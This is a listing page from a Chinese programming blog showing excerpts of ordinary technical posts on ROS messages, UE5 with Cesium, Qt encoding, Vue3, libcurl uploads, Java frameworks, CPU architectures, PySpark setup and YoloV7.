<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03117b6b3edb716f9d81a64f611e532c/" rel="bookmark">
			ros消息类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、sensor_msgs/LaserScan 2、sensor_msgs/PointCloud2 3、sensor_msgs/Imu 4、nav_msgs/Odometry 5、nav_msgs/Path 6、自定义消息类型 自定义消息类型的使用方法: 链接
7、点云消息的发布与订阅 #include &lt;sensor_msgs/PointCloud2.h&gt; ros::Publisher pubLaserCloud; ros::Subscriber subLaserCloud; pcl::PointCloud&lt;PointType&gt;::Ptr laserCloud(new pcl::PointCloud&lt;PointType&gt;()); ros::Subscriber subLaserCloud = nh.subscribe&lt;sensor_msgs::PointCloud2&gt;("/velodyne_points", 100, laserCloudHandler); void laserCloudHandler(const sensor_msgs::PointCloud2ConstPtr &amp;laserCloudMsg) { pcl::PointCloud&lt;pcl::PointXYZ&gt; laserCloudIn; pcl::fromROSMsg(*laserCloudMsg, laserCloudIn) ...... *laserCloud = laserCloudIn; sensor_msgs::PointCloud2 laserCloudOutMsg; pcl::toROSMsg(*laserCloud, laserCloudOutMsg); laserCloudOutMsg.header.stamp = laserCloudMsg-&gt;header.stamp; laserCloudOutMsg.header.frame_id = "/camera_init"; pubLaserCloud.publish(laserCloudOutMsg); } 8、里程计和轨迹消息的发布 #include &lt;nav_msgs/Odometry.h&gt; #include &lt;nav_msgs/Path.h&gt; #include &lt;geometry_msgs/PoseStamped.h&gt; nav_msgs::Odometry laserOdometry; laserOdometry.header.frame_id = "/camera_init"; laserOdometry.child_frame_id = "/laser_odom"; laserOdometry.header.stamp = ros::Time().fromSec(timeSurfPointsLessFlat); laserOdometry.pose.pose.orientation.x = q_w_curr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03117b6b3edb716f9d81a64f611e532c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34272eece7b063eee4b93348cf57b050/" rel="bookmark">
			在UE5中使用Cesium插件加载谷歌全景地图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		虚幻引擎5（UE5）是一款强大的游戏开发引擎，它提供了许多功能和插件来创建逼真的游戏世界。其中，Cesium是一款流行的地理信息系统（GIS）工具集，它允许您加载和展示地理数据。本文将介绍如何在UE5中使用Cesium插件加载谷歌全景地图，为您打造更逼真的游戏环境。
一、安装和配置Cesium插件 首先，您需要在UE5中安装和配置Cesium插件。请按照以下步骤执行：
打开UE5编辑器，在“Edit”菜单中选择“Plugins”。在插件窗口中，搜索框中输入“Cesium”，并点击“Install”按钮安装Cesium插件。安装完成后，点击插件列表中的Cesium插件，确保它已启用。 二、获取谷歌全景地图的API密钥 要加载谷歌全景地图，您需要先获取谷歌地图的API密钥。请按照以下步骤进行操作：
访问Google Cloud平台（https://console.cloud.google.com/）并登录您的Google账号。创建一个新项目，并在该项目中启用Maps JavaScript API。生成API密钥，并确保启用了Street View API和Maps SDK for JavaScript。 三、在UE5中加载谷歌全景地图 接下来，我们将在UE5中使用Cesium插件加载谷歌全景地图。请按照以下步骤进行操作：
在UE5编辑器中，创建一个新的Level或打开现有的Level。在Level场景中添加一个CesiumGeoreferenceActor（可以在Cesium插件中找到）。在CesiumGeoreferenceActor的属性面板中，找到Google Maps部分，并将之前获取的API密钥输入到API Key字段中。创建一个新的Actor（例如Static Mesh Actor或Skeletal Mesh Actor），并将其放置在您想要展示谷歌全景地图的位置。在该Actor的事件图表中，使用“Begin Play”事件，并添加一个节点来加载谷歌全景地图。 获取CesiumGeoreferenceActor的引用，并使用“Load 360 Panorama”函数。在函数中，输入纬度和经度坐标来指定全景地图的位置。您可以根据需要设置其他参数，例如全景图的高度和显示范围等。 四、运行游戏并查看结果 完成以上步骤后，您可以运行游戏并在UE5中查看加载的谷歌全景地图。当您的角色进入所放置的Actor的位置时，将会自动加载谷歌全景地图，并以全景形式展示出来。
结论： 通过安装和配置Cesium插件，获取谷歌地图的API密钥，并在UE5中加载和展示谷歌全景地图，您可以为游戏环境增添更逼真和细节的地理信息。这将使您的游戏更加生动和吸引人，为玩家提供更好的游戏体验。
希望本文对您在UE5中使用Cesium插件加载谷歌全景地图有所帮助。如果您需要更多关于Cesium插件或UE5的详细信息，请参阅官方文档或咨询相关专业人员。祝您在游戏开发中取得成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cd12c19afe6e7d8fd68dfcdcc286c7e/" rel="bookmark">
			QT 乱码问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Qt之QSettings中文乱码的问题 #ifdef WIN32 //no set QTextCodec::codecForName("UTF-8"); GBK-&gt;UTF-8 //m_configIniRead = new QSettings(QString::fromLocal8Bit(path_ini.c_str()), QSettings::IniFormat); m_configIniRead = new QSettings(AfGbk::ToQString(path_ini), QSettings::IniFormat); m_configIniRead-&gt;setIniCodec(QTextCodec::codecForName("utf-8")); #else m_configIniRead = new QSettings(path_ini.c_str(), QSettings::IniFormat); #endif QString 中文编码转换 QT字符编码开发中遇到了很多坑，一不小心就会出现中文乱码， 在这里小结一下。
QString本身是编码是unicode在windows下local8Bit是GBK源代码即.cpp文件是有编码的，不同编译器也有默认编码，如： 微软VS的中的cl采用GBKMingw中的g++不带BOM的UTF-8Linux下的g++ 采用带BOM的UTF-8 这3中编码进行保存 QString GBK2UTF8(const QString &amp;str) { QTextCodec *utf8 = QTextCodec::codecForName("UTF-8"); return utf8-&gt;toUnicode(str.toUtf8()); } QString UTF82GBK(const QString &amp;str) { QTextCodec *gbk = QTextCodec::codecForName("GB18030"); return gbk-&gt;toUnicode(str.toLocal8Bit()); } std::string GBK2UTF8(std::string &amp;str) { QString temp = QString::fromLocal8Bit(str.c_str()); std::string ret = temp.toUtf8().data(); return ret; } std::string UTF82GBK(std::string &amp;str) { QString temp = QString::fromUtf8(str.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6cd12c19afe6e7d8fd68dfcdcc286c7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f35b612b9b53639ec3bbfa400add8b46/" rel="bookmark">
			创建Vue3.0工程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.使用 vue-cli 创建 官方文档
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上 vue --version ## 安装或者升级你的@vue/cli npm install -g @vue/cli ## 创建 vue create vue3_test ## 启动 cd vue3_test npm run serve 2.使用 vite 创建 官方文档
vite官网
什么是vite？—— 新一代前端构建工具。优势如下： 开发环境中，无需打包操作，可快速的冷启动。轻量快速的热重载（HMR）。真正的按需编译，不再等待整个应用编译完成。 传统构建 与 vite构建对比图
## 创建工程 npm init vite-app &lt;project-name&gt; (vue3_test_vite) ## 进入工程目录 cd &lt;project-name&gt; (vue3_test_vite) ## 安装依赖 npm install ## 运行 npm run dev 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff0a3ce2bdea1a0f479ec4022729a865/" rel="bookmark">
			微信小程序报错errno: 600001
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因 token问题检查下微信后台配置的合法域名如果之前能正常访问，大概率是证书出问题了 证书问题解决方案 访问https://myssl.com/查看证书目前的情况 出现证书链不完整的状况，可点击蓝色的链接去获取修复后的证书链
将以下的字段复制到后端服务器的.crt文件下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f055fc1444d4f6d6252b43aff0b0ab28/" rel="bookmark">
			libcurl http post 二进制流（文件片段上传）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux C/++ libcurl form-data 表单post 二进制数据流到后台服务器
/* 添加form-data 表单项 以提交文件片段为例 文件分片form字段 */ int WebUploader::curlPostSlice(SliceFile&amp; file,int sliceIndex,string &amp;zoneMd5) { struct curl_httppost *formpost = NULL; struct curl_httppost *lastptr = NULL; CURLFORMcode resultForm; int ret =0; struct curl_httppost *p = NULL; resultForm = curl_formadd( &amp;formpost, &amp;lastptr, CURLFORM_COPYNAME, "id", CURLFORM_COPYCONTENTS, (const char *) "WU_FILE_0", CURLFORM_END ); resultForm = curl_formadd( &amp;formpost, &amp;lastptr, CURLFORM_COPYNAME, "name", CURLFORM_COPYCONTENTS, (const char *) file.file_name().c_str(), CURLFORM_END ); //application/octet-stream //video/mp4 resultForm = curl_formadd( &amp;formpost, &amp;lastptr, CURLFORM_COPYNAME, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f055fc1444d4f6d6252b43aff0b0ab28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4809928b8a864a806f54c2437ffc0d8/" rel="bookmark">
			usbcan、can分析仪接口方式供选
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		usbcan、can分析仪、usb接口can卡具有一体便携式、小巧、真材实料、工业四级、软件命令开关内置式终端电阻、三种接口方式供选等特点。
1、小巧、一体便携式 市面上usbcan卡的形态一般是体积较大的长方形铁盒+usb线缆，实际上，usb接口can卡作为一个工具，工程师经常将其放置包中带到各个现场使用，小巧、一体、便携才是使用者的选择。
2、真材实料、工业四级 来可的usbcan卡虽然小巧，但是用料却是极其讲究，usb线缆是E341631欧盟认证高规格电缆、usb接头是镀金品牌插件、采用金升阳电源模块和信号隔离芯片实现can接口的2500VDC电气隔离、FCI品牌db9公头，usb口设计有esd静电防护功能，从而确保usbcan卡经久耐用。可靠性测试项目：esd接触放电8KV、浪涌±1KV、脉冲群±2KV，工业四级，符合ce-emc、ie/en61000-4-2/4/5标准。
2-1、金升阳电源模块实现2500VDC电源隔离 2-2、FCI品牌DB9公头、镀金品牌插件，经久耐用、接触优良 2-3、镀金品牌USB插件 2-3、E341631欧盟认证高规格电缆 2-4、优秀的EMC性能，接口全防护设计 采用金升阳电源模块和信号隔离芯片实现can接口的2500VDC电气隔离、usb口设计有esd静电防护功能及其它众多防护器件。可靠性测试项目：esd接触放电8KV、浪涌±1KV、脉冲群±2KV，工业四级，符合ce-emc、ie/en61000-4-2/4/5标准。
3、软件命令开关内置式终端电阻 与市面上众多品牌usbcan卡设计不同，既不是外接120欧姆电阻，也不是拨动开关启用板载电阻，而是内置120欧姆终端电阻，软件发送命令，开启或关闭板载继电器达到启用和关闭启用终端电阻的目的。命令集成到测试软件LCANTest快捷键菜单栏中，方便实用；或者，用户根据提供的终端电阻开关命令文本协议，内嵌到自己的应用软件中。
3-1、板载继电器 3-2、选中勾选栏，启用终端电阻，去掉勾选不启用终端电阻 4、三种接口方式供选 确保现场设备can接口与USBcan卡的can接口一致，usbcan卡上有接口引脚定义，指引现场接线。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffa5898024e0d14490e2a6c3ee8432e9/" rel="bookmark">
			不可不知的八个出色的Java项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java生态系统里面有形形色色、五花八门的开源项目，这些项目是为了满足各种可以想象到的需求而开发的。我们很容易错过其中一些出色的项目。下面介绍七个开源Java项目，从全栈应用程序开发、微服务、Wasm到JVM替代方案，各种需求都能满足。
目录
1. Vaadin的Hilla
2. jHipster
3. JNPF
4. GraalVM
5. Micronaut
6. MicroStream
7. TeaVM
8. Apache Flink
1. Vaadin的Hilla Hilla是一个全栈框架，拥有基于Java的后端和JavaScript前端。它支持响应式前端框架React和Lit。
Hilla让您可以用一个简单的命令：npx @vaadin/cli init --hilla foundry-hilla搭建一个新的全栈项目。这是一个NPM命令，但它将部署带有Vite构建的前端目录的标准Maven布局，并且一切都准备就绪，使用./mvnw脚本即可协同运行。
Hilla在两个应用程序之间强制执行类型，这意味着您的IDE可以在Java API和使用它的TypeScript前端当中检测和传递更改。在这个框架中，自动完成和重构完全可以正常使用。这项功能在感觉上类似全TypeScript环境中的tRPC。
Hilla还通过JPA（在Hibernate上）与MySQL和PostgreSQL等许多SQL数据库集成持久性。
它有点像jHipster，但更自成一体。这意味着Hilla在它所能结合的技术方面不是很灵活，但它为您提供了一条更平坦的跨界之路。Hilla得到了精心的维护和记录。如果您需要用Java构建一个全栈应用程序，并且喜欢React或Lit作为前端，Hilla是一种值得考虑的出色框架。
相关链接：https://www.infoworld.com/article/3655139/intro-to-hilla-the-full-stack-java-framework.html
2. jHipster 继续围绕全栈框架这个主题，我们接下来介绍jHipster。jHipster采用了一种非常灵活的方法，可以使用Java作为API中间件，将多种不同的技术整合到一个连贯的堆栈中。您可以从几个响应式前端以及众多SQL和NoSQL数据库系统中进行选择。
与Hilla一样，jHipster首先使用NPM软件包（jHipster -generator工具）生成应用程序。该工具将逐步引导您填完一份问卷，让您对其功能有一番清楚的了解。如果您碰巧遇到ERR_PACKAGE_PATH_NOT_EXPORTED错误，请参阅这里的解决方案：https://github.com/jhipster/generator-jhipster/issues/19627。
jHipster首先让您在单体式应用程序、微服务架构或网关之间进行选择，让您对该框架的范围有一些了解。如果您选择单体式应用程序，随后就可以使用Spring WebFlux把它变成一个类似响应式的应用程序。接下来，您可以选择不同类型的身份验证，比如JWT或Oauth 2。然后，您得从几个数据库系统中进行选择，比如SQL、MongoDB和Cassandra，随后从二级应用程序缓存中进行选择，比如Ehcache、Memcached或Redis。
接下来，jHipster生成器工具允许添加另外几项技术：用于搜索引擎的Elasticsearch、使用Spring WebSocket的WebSockets、作为异步消息代理的Apache Kafka，以及使用OpenAPI-generator的API优先开发技术。接下来，您可以从几个前端框架中选择一个，并生成Admin UI（如果您这么选择的话）以及几个主题。
jHipster还拥有国际化和测试功能，它既支持Maven又支持Gradle。
这是相当强大的功能。它还能够生成域模型、数据结构以及与之配套的UI。jHipster是构建多种类型的Java应用程序的出色选择。
相关链接：Intro to JHipster: A full-stack framework for Java and JavaScript | InfoWorld​​​​​​
3. JNPF 一款优秀的国产开发平台，采用Java+.net双技术引擎，近年在市场表现和产品竞争力方面表现较为突出，主流的前后分离框架（SpringBoot+Mybatis-plus+Ant-Design+Vue3）。代码生成器依赖性低，灵活的扩展能力，可灵活实现二次开发。
平台基于 SpringBoot 微服务架构、 SpringCloud 模式，完善了平台的扩增基础，满足系统快速开发、灵活拓展、无缝集成和高性能应用等综合能力；
为了支撑更高技术要求的应用开发，从数据库建模、Web API构建到页面设计，与传统软件开发几乎没有差异，只是通过低代码可视化模式，减少了构建“增删改查”功能的重复劳动。
有了它，开发人员在开发过程中就可以轻松上手，充分利用传统开发模式下积累的经验。所以JNPF平台对于程序员来说，有着很大帮助。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffa5898024e0d14490e2a6c3ee8432e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10a87f0ae0e5930ab164b7651e18bcbb/" rel="bookmark">
			Vue3简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.Vue3简介 2020年9月18日，Vue.js发布3.0版本，代号：One Piece（海贼王）耗时2年多、2600+次提交、30+个RFC、600+次PR、99位贡献者github上的tags地址 2.Vue3带来了什么 2.1.性能的提升 打包大小减少41%初次渲染快55%, 更新渲染快133%内存减少54%… 2.2.源码的升级 使用Proxy代替defineProperty实现响应式重写虚拟DOM的实现和Tree-Shaking… 2.3.拥抱TypeScript Vue3可以更好的支持TypeScript 2.4.新的特性 Composition API（组合API） setup配置ref与reactivewatch与watchEffectprovide与inject… 新的内置组件 FragmentTeleportSuspense 其他改变 新的生命周期钩子data 选项应始终被声明为一个函数移除keyCode支持作为 v-on 的修饰符… 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02fb9e0e7704a0ee648c8a6141bdc7d2/" rel="bookmark">
			template might not exist or might not be accessible by any of the config ured Template Resolvers
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本地运行没问题，发布到服务器报错
t not be accessible by any of the configured Template Resolvers] with root cause org.thymeleaf.exceptions.TemplateInputException: Error resolving template "/business/hitReception/reportforms/index", template might not exist or might not be accessible by any of the config ured Template Resolvers at org.thymeleaf.TemplateRepository.getTemplate(TemplateRepository.java:246) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1104) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1060) at org.thymeleaf.TemplateEngine.process(TemplateEngine.java:1011) at org.thymeleaf.spring4.view.ThymeleafView.renderFragment(ThymeleafView.java:335) at org.thymeleaf.spring4.view.ThymeleafView.render(ThymeleafView.java:190) at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1286) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1041) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:984) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02fb9e0e7704a0ee648c8a6141bdc7d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3edf328bee804a36d0df89af80ba1c56/" rel="bookmark">
			【CPU】关于x86、x86_64/x64、amd64和arm64/aarch64
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么叫x86和x86_64和AMD64?
为什么大家叫x86为32位系统？
为什么软件版本会注明 for amd64版本，不是intel64呢？
x86是指intel的开发的一种32位指令集，从386开始时代开始的，一直沿用至今，是一种cisc指令集，所有intel早期的cpu，amd早期的cpu都支持这种指令集，intel官方文档里面称为“IA-32”
x84_64是x86 CPU开始迈向64位的时候，有2选择：
1、向下兼容x86。
2、完全重新设计指令集，不兼容x86。
AMD抢跑了，比Intel率先制造出了商用的兼容x86的CPU，AMD称之为AMD64，抢了64位PC的第一桶金，得到了用户的认同。
Intel选择了设计一种不兼容x86的全新64为指令集，称之为IA-64（这玩意似乎就是安腾），但是比amd晚了一步，而且IA-64也挺惨淡的，因为是全新设计的CPU，没有编译器，也不支持windows（微软把intel给忽悠了，承诺了会出安腾版windows server版，但是迟迟拿不出东西）。后来不得不在时机落后的情况下也开始支持AMD64的指令集，但是换了个名字，叫x86_64，表示是x86指令集的64扩展，大概是不愿意承认这玩意是AMD设计出来的。
实际上，x86_64,x64,AMD64基本上是同一个东西，我们现在用的intel/amd的桌面级CPU基本上都是x86_64，与之相对的arm,ppc等都不是x86_64。
x86、x86_64主要的区别就是32位和64位的问题，x86中只有8个32位通用寄存器，eax,ebx,ecx，edx, ebp, esp, esi, edi。
x86_64把这8个通用寄存器扩展成了64位的，并且比x86增加了若干个寄存器（好像增加了8个，变成了总共16个通用寄存器）。同样的MMX的寄存器的位数和数量也进行了扩展。此外cpu扩展到64位后也能支持更多的内存了，等等许多好处。
对于普通程序来说，CPU位数的扩展、寄存器数量的增加不会带来明显的性能提升，比如IE浏览器、Office办公这类的软件。特定的程序很能够充分利用64位CPU、更多的寄存器带来的优势，比如MMX除了能提升多媒体程序的性能，对矩阵、多项式、向量计算都能带来提升，更多的MMX寄存器、更大的寄存器字长都有利于SIMD指令的执行，能够提升CPU对数据的吞吐量（RISC指令集的CPU动不动就有数百个寄存器，可以有效的缓存中间计算结果，不需要把中间结果写入内存，从而减少内存访问次数，显著提升性能）
x86 x86架构（The x86 architecture）是微处理器执行的计算机语言指令集，指一个intel通用计算机系列的标准编号缩写，也标识一套通用的计算机指令集合。
1978年6月8日，Intel发布了新款16位微处理器“8086”，也同时开创了一个新时代：x86架构诞生了。
在40年的发展史中，x86家族不断壮大，从桌面转战笔记本、服务器、超级计算机、编写设备，期间还挫败或者限制了很多竞争对手的发展，让不少处理器厂商及其架构技术成为历史名字，即使有些封闭发展的也难以为继，比如苹果就已经放弃PowerPC了。
AMD64/x86-64 x86-64有时会简称为“x64”，是64位微处理器架构及其相应指令集的一种，也是Intel x86架构的延伸产品。
“x86-64”1999由AMD设计，AMD 首次公开 64 位集以扩充给 IA-32，称为 x86-64（后来改名为 AMD64）。 AMD64架构在IA-32上新增了64位寄存器，并兼容早期的16位和32位软件，可使现有以x86为对象的编译器容易转为AMD64版本。
由于AMD64和Intel64基本上一致，很多软硬件产品都使用一种不倾向任何一方的词汇来表明它们对两种架构的同时兼容。出于这个目的，AMD对这种CPU架构的原始称呼 - “x86-64”被不时地使用，还有变体“x86_64”。其他公司如微软和Sun在营销资料中使用“x64”作为对“x86-64”的缩写。
许多操作系统及产品，尤其那些是在Intel进入这块市场之前就引入“x86-64”支持的，使用“AMD64”或“amd64”同时指代AMD64和Intel64。
现在的x86 CPU在位数上有32/64bit之分，在ARCH上有又x86/x86_64/x64/i386/IA32/IA64/amd64
最近又新出来一个x32，还好不是ARCH，只是ABI，没有那么混乱。
先说一下x86的这些arch，不要求很严格的话，基本上可以用下面的公式来表达：
x86=i386=IA32
amd64=x86_64=x64!=IA64
其实这两个等式里很多都是别名，严格说的话，x86的世界里只存在x86/x86_64/IA64三种架构。
当年AMD先于Intel推出向下兼容的amd64 CPU，而Intel推出的不兼容32位系统的IA64惨淡收场(被MS放了鸽子)，后来Intel在指令上支持了amd64，不过不愿意叫amd64，改了个名字x86_64。
再说64bit/32bit的兼容性问题：
现在的64bit CPU实际上都做了兼容32bit的特殊设计，所以64bit的CPU上运行32bit的软件(包括kernel/app， driver除外)是没有问题。反过来，32bit的CPU上运行64bit的软件是不可以的。
最后说重点，64bit相比32bit的性能优势：
这里不考虑64bit硬件上运行32bit软件的这种过度方式。
从架构上来说，64bit拥有64bit 的register和64bit的bus，在数据传输效率上比32bit要高不少；另外，64bit地址总线的寻址空间突破了4G的限制。
所以，对于大内存，密集数据运算的应用场景，64bit的优势是非常明显的。网上有一些benchmark，这里不贴了。
但是，对于小内存系统，64bit的CPU在某些状况下可能比32bit CPU的效率更低。
因为64 bit的CPU的地址是64位的，指针是64位的，编译生成的二进制文件更大，运行时占用的内存更多;另一方面，因为64位地址的问题，cache中能存放的指令就更少，所以更容易导致cache的miss。
所以在某些应用场景，64 bitCPU的更大的寻址空间，更快的数据传递，更快的浮点运算的特性， 与其64 bit的地址/指针所导致的cache miss的特性，始终并存。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3edf328bee804a36d0df89af80ba1c56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69724d2fd15640b61812bea8d1e8fa9c/" rel="bookmark">
			pycharm 配置 spark环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装好JDK：
JDK所有人肯定都装了，这里就不细说明了。
2.安装Hadoop并配置环境变量：
hadoop下载地址：Index of /apache/hadoop/common
解压hadoop-2.8.3.tar.gz特定路径，如：D:\hadoop-2.8.3
添加系统变量HADOOP_HOME：D:\hadoop-2.8.3
在系统变量PATH中添加：D:\hadoop-2.8.3\bin
安装组件winutils：将winutils中对应的hadoop版本中的bin替换自己hadoop安装目录下的bin
3.Spark环境变量配置：
说明：spark是基于hadoop之上的，运行过程中会调用相关hadoop库，如果没配置相关hadoop运行环境，会提示相关出错信息，虽然也不影响运行。
下载对应hadoop版本的spark：Apache Download Mirrors。本人使用的是hadoop2.8.3版本，spark是spark-2.4.5-bin-hadoop2.7。可以使用
解压文件到：E:\dju_softwares\DSJ_gz\spark-2.4.5-bin-hadoop2.7
添加PATH值：E:\dju_softwares\DSJ_gz\spark-2.4.5-bin-hadoop2.7\bin
新建系统变量SPARK_HOME：E:\dju_softwares\DSJ_gz\spark-2.4.5-bin-hadoop2.7
5.在CMD中运行pyspark：
出现以下图说明安装配置正常
6.在pycharm中配置spark
打开PyCharm，创建一个Project。然后选择“Run” -&gt;“Edit Configurations”–&gt;点击+创建新的python Configurations
选择 “Environment variables” 增加SPARK_HOME目录与PYTHONPATH目录。
SPARK_HOME:Spark安装目录
PYTHONPATH:Spark安装目录下的Python目录下的lib下的py4j-0.10.7-src.zip
选择 File-&gt;setting-&gt;你的project-&gt;project structure
右上角Add content root添加：py4j-some-version.zip和pyspark.zip的路径，这两个文件都在spark-2.4.5-bin-hadoop2.7\python\lib文件夹中。
7.测试环境是否配置成功：
import os
import sys
os.environ['SPARK_HOME'] = "D:\adasoftware\spark"
sys.path.append("D:\adasoftware\spark\python")
try:
from pyspark import SparkContext
from pyspark import SparkConf
print("Successfully imported Spark Modules")
except ImportError as e:
print("Can not import Spark Modules", e)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69724d2fd15640b61812bea8d1e8fa9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa546fdcc2d51948fb75c762a5eb31cc/" rel="bookmark">
			vue3中父子传值 defineProps和defineEmits用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//父组件 &lt;template&gt; &lt;Tab :page="page" //传递值 @pageFn="pageFn" //传递方法 &gt;&lt;/Tab&gt; &lt;/template&gt; &lt;script setup&gt; import Tab from "../../components/freight/Tab.vue"; import { ref, reactive, toRefs, onMounted } from "vue"; const page=ref(1) const pageFn=(val)=&gt;{ page.value=val } &lt;/script&gt; //子组件 &lt;template&gt; &lt;button @click="butFn"&gt;改变page值:{{page}}&lt;/button&gt; &lt;/template&gt; &lt;script setup&gt; import { ref, reactive, toRefs, defineProps, defineEmits } from "vue"; defineProps(["page"]); //接收父组件传来的值 const emit = defineEmits(["pageFn"]); //定义一个变量来接收父组件传来的方法 const butFn=()=&gt;{ emit("pageFn",5) } &lt;/script&gt; vue3父组件传值注意点 1.defineProps的用法： defineProps的用法 //第一种 defineProps(["page"]); //第二种 defineProps({ page:Number }); //第三种 defineProps({ page:{ type:Number, default:2 } }); //第四种 defineProps:{ page:[String,Number] } 第二种方式可以设置传来值的类型
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa546fdcc2d51948fb75c762a5eb31cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f06e51df3756d58109709fda61bfeb1/" rel="bookmark">
			[神经网络]YoloV7
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Yolo系列是一类很经典的目标检测网络，属于anchor-base型网络，即需要先产生先验框然后筛选先验框得到预测框。同时它也是One-Stage网络，即不需要额外的网络结构来筛选先验框。这两种特点使得它具备了运算速度快和计算精度相对较高的特点。
比较常见的Yolo网络有：YoloV3，YoloV5，YoloV7等。本文主要从YoloV7网络入手进行讨。论。
一、YoloV7 YoloV7的网络结构如图所示，主要可以分为3个部分：Backbone，FPN和Yolo Head。其中，Backbone负责对输入图片进行特征提取，这个结构最终会输出三个不同尺寸的特征层。FPN网络负责加强特征提取，它会将Backbone提取出的三个特征层进行部分特征融合（以融合不同尺寸的特征信息，主要依靠上采样和下采样进行实现）。Yolo Head负责对anchor进行分类和回归，输出最终的预测框。
1.Backbone 从上面的网络结构图可以看到，不同于Faster R-CNN等网络直接套现成的骨干网络，YoloV7的骨干网络主要由Multi_Concat_Block(多分支堆叠模块)和Transition_Block组成。
Multi_Concat_Block结构如图，可以看到主要是由卷积标准激活函数构成。共计4个通路，分别经过了1,1,3,5个卷积标准激活函数。最后这4个通路的特征层堆叠后由一个卷积标准激活函数进行特征整合。
